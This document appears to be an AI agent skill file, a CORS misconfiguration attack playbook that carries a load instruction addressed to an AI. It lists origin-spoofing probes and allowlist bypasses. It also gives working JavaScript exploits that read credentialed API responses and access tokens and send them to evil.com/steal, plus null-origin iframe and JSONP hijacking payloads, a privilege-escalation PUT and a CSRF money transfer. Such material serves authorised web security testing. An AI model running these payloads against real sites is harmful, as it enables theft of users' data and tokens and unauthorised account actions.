---
name: cors-cross-origin-misconfiguration
description: >-
  CORS misconfiguration testing playbook. Use when analyzing cross-origin trust,
  credentialed browser reads, origin reflection, null origin, JSONP hijacking,
  preflight policy bugs, and browser-based access to authenticated APIs.
---

# SKILL: CORS Misconfiguration — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: CORS misconfiguration enables cross-origin data theft when `Access-Control-Allow-Origin` reflects attacker-controlled origins, especially with `Access-Control-Allow-Credentials: true`. Covers reflected origin, null origin via sandboxed iframe, JSONP hijacking, SOP bypass chains, and dual-site attack patterns. For JSONP deep-dive, SOP internals, and local lab setup, load the companion [SCENARIOS.md](./SCENARIOS.md).

## QUICK START

### First-pass probes

| Situation | Probe | Why |
|---|---|---|
| Any JSON API with auth | Send `Origin: https://evil.com` header | Check if reflected in ACAO |
| ACAO reflects origin | Check for `Allow-Credentials: true` | Credentials + reflection = data theft |
| Subdomain in allowlist | Try `evil.target.com` or `target.com.evil.com` | Subdomain bypass |
| `null` in ACAO | Use sandboxed iframe as origin | Null origin bypass |
| JSONP endpoints found | Check `callback` parameter reflection | JSONP hijacking |

### First-pass probe set

```text
Origin: https://evil.com
Origin: null
Origin: https://target.com.evil.com
Origin: https://evil.target.com
Origin: https://target.com@evil.com
Origin: https://evil.com%00.target.com
```

---

## 1. CORE CONCEPT

### Same-Origin Policy (SOP)

SOP prevents `https://evil.com` from reading responses from `https://target.com`. CORS (Cross-Origin Resource Sharing) relaxes SOP selectively via response headers.

### CORS Response Headers

| Header | Purpose |
|--------|---------|
| `Access-Control-Allow-Origin` | Which origins may read the response |
| `Access-Control-Allow-Credentials` | Whether cookies/auth are included |
| `Access-Control-Allow-Methods` | Which HTTP methods are permitted |
| `Access-Control-Allow-Headers` | Which request headers are permitted |
| `Access-Control-Max-Age` | Preflight cache duration |

### The Dangerous Combination

```
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```
This allows `evil.com` to make authenticated requests to `target.com` and read the responses — full data theft.

---

## 2. REFLECTED ORIGIN EXPLOITATION

### Basic Reflected Origin

```http
GET /api/user HTTP/1.1
Host: target.com
Origin: https://evil.com
Cookie: session=abc123

→ Response:
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
{"email": "victim@target.com", "role": "admin"}
```

**Exploit PoC** (host on `evil.com`):

```html
<script>
fetch('https://target.com/api/user', {
  credentials: 'include'
}).then(r => r.json()).then(d => {
  fetch('https://evil.com/steal?data=' + JSON.stringify(d));
});
</script>
```

### Null Origin via Sandboxed Iframe

```html
<iframe sandbox="allow-scripts" src="data:text/html,
<script>
fetch('https://target.com/api/user', {credentials:'include'})
.then(r=>r.json()).then(d=>{
  fetch('https://evil.com/steal?d='+JSON.stringify(d))
})
</script>"></iframe>
```

Server must never trust `null` as an origin.

---

## 3. ORIGIN ALLOWLIST BYPASS

### Subdomain Bypass

```
// Server allowlist checks: does Origin end with target.com?
Origin: https://evil.target.com  ← attacker-controlled subdomain

// Register: evil.target.com (if DNS allows)
// Or: x.target.com.evil.com  (if check is flawed)
```

### Prefix/Suffix Confusion

| Server Check | Bypass Origin |
|---|---|
| `Origin.endsWith("target.com")` | `https://evil.target.com` |
| `Origin.startsWith("https://target.com")` | `https://target.com.evil.com` |
| `Origin.includes("target.com")` | `https://evil.com?target.com` |
| Regex `target\.com$` | `https://targetXcom` (if DNS resolves) |
| `Origin == "null"` check missing | Sandboxed iframe sends `null` |
| Trusted `target.com` only | `https://target.com@evil.com` (some parsers) |

---

## 4. JSONP HIJACKING

### Classic JSONP

```http
GET /api/user?callback=getData HTTP/1.1
Host: target.com
Cookie: session=abc123

→ Response:
getData({"email": "victim@target.com", "role": "admin"})
```

**Exploit PoC**:

```html
<script>
function getData(data) {
  fetch('https://evil.com/steal?d=' + JSON.stringify(data));
}
</script>
<script src="https://target.com/api/user?callback=getData"></script>
```

### JSONP + CORS Chain

When JSONP endpoint also has CORS misconfiguration, combine both vectors for maximum impact.

---

## 5. PREFLIGHT TRUST BUGS

### Bypassing Preflight for Simple Requests

Some requests don't trigger preflight (simple requests):
- `GET`, `HEAD`, `POST` (with limited content types)
- `application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain`

If the server only checks CORS on preflight but not on the actual request, simple requests bypass the check entirely.

### PUT/DELETE Without Preflight

```javascript
// Some servers fail to validate CORS on non-standard methods:
fetch('https://target.com/api/admin', {
  method: 'PUT',
  credentials: 'include',
  headers: {'Content-Type': 'text/plain'},
  body: '{"role": "admin"}'
});
```

---

## 6. CORS + AUTH CHAINS

### Token Theft via CORS

```javascript
// If /api/token returns auth tokens and has CORS misconfiguration:
fetch('https://target.com/api/token', {credentials: 'include'})
.then(r => r.json())
.then(data => {
  // data = {access_token: "...", refresh_token: "..."}
  new Image().src = 'https://evil.com/steal?t=' + data.access_token;
});
```

### CORS → CSRF Chain

When CORS is misconfigured to allow any origin without credentials, it can still enable CSRF:
```javascript
// POST with custom headers (triggers preflight, but ACAO allows it)
fetch('https://target.com/api/transfer', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: '{"to": "attacker", "amount": 1000}'
});
```

---

## DECISION TREE

```
Found JSON/API endpoint with authentication?
├── Send Origin: https://evil.com
│   ├── ACAO reflects evil.com?
│   │   ├── Allow-Credentials: true? → Full data theft PoC
│   │   └── No credentials? → Still useful for CSRF via CORS
│   ├── ACAO = null?
│   │   └── Test with sandboxed iframe → data theft
│   └── ACAO = * (star)?
│       └── Star + credentials is invalid per spec → check browser behavior
│
├── Origin not reflected?
│   ├── Test subdomain bypass: evil.target.com
│   ├── Test prefix confusion: target.com.evil.com
│   └── Test null origin via sandboxed iframe
│
├── JSONP endpoint found?
│   ├── Callback parameter reflected? → JSONP hijacking PoC
│   └── Combine with CORS for amplified impact
│
└── Preflight patterns?
    ├── Simple request bypass? → Test GET/POST without preflight
    └── Method/headers allowed? → Exploit PUT/DELETE
```

---

## TESTING CHECKLIST

- [ ] Send `Origin: https://evil.com` to all authenticated JSON endpoints
- [ ] Check if ACAO reflects arbitrary origin
- [ ] Check if `Access-Control-Allow-Credentials: true` accompanies reflection
- [ ] Test `Origin: null` via sandboxed iframe
- [ ] Test subdomain bypass (evil.target.com, target.com.evil.com)
- [ ] Test prefix/suffix confusion in origin validation
- [ ] Check for JSONP endpoints with callback parameter
- [ ] Test preflight bypass via simple request types
- [ ] Verify CORS headers on error responses (may differ from success)
- [ ] Test HTTP/HTTPS scheme confusion in origin validation

---

## TOOL ADAPTATION

Use the currently visible HTTP request/replay or browser tools to send controlled `Origin` variants and compare responses. Do not assume a Burp MCP or scanner is installed; role visibility and RBAC/HITL remain authoritative.

---

## RELATED ROUTING

- [CSRF Testing](../csrf-cross-site-request-forgery/SKILL.md) — when state-changing operations lack CSRF protection
- [OAuth/OIDC Misconfiguration](../oauth-oidc-misconfiguration/SKILL.md) — when redirect URI or token handling is flawed
- [JWT/OAuth Token Attacks](../jwt-oauth-token-attacks/SKILL.md) — when token validation or signing is weak
- [Clickjacking](../clickjacking/SKILL.md) — when pages lack X-Frame-Options (complementary framing attack)

